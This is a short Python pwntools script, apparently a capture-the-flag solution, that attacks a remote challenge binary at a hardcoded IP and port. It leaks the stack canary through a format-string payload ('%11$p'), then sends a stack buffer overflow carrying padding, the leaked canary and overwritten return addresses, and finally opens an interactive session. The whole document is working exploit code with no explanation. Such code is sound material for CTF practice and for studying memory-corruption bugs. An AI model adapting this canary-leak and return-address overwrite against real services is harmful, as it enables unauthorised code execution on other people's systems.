from pwn import *

#p = process("./chall")
p = remote("34.101.174.85", 10002)
#for i in range(1,30):
#	p.recv()
payload = b"%11$p"
p.sendline(payload)
p.recvline()
p.recvline()
canary = p.recvuntil("\n").decode()
canary = canary[2:]
canaryHex = p64(int(canary,16))
print(canaryHex)

payload = b"a"*40
payload += canaryHex
payload += b"a"*8
payload += p64(0x000000000040128f)
payload += p64(0x0000000000401290)

print(p.recv())
p.sendline(payload)
p.interactive()
